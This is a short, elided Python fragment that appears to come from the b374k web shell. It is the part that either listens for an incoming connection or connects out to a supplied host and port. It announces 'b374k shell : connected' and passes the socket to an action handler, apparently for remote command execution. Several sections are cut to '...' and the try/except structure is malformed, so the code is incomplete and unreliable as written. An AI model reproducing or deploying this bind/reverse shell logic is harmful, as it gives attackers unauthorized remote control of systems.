...
if len(g)==2:
    ...
    try:(c,a)=s.accept()
        ...
        if os.name!="nt":
            c.send(("b374k shell : connected\n").encode('utf-8'))
        else:
            c.send(("b374k shell : connected"+prompt()).encode('utf-8'))
        action(c)
if len(g)==3:
    try: s.connect((h,p))
    except:
        ...
        if os.name!="nt":
            s.send(("b374k shell : connected\n").encode('utf-8'))
        else:
            s.send(("b374k shell : connected"+prompt()).encode('utf-8'))
        action(s)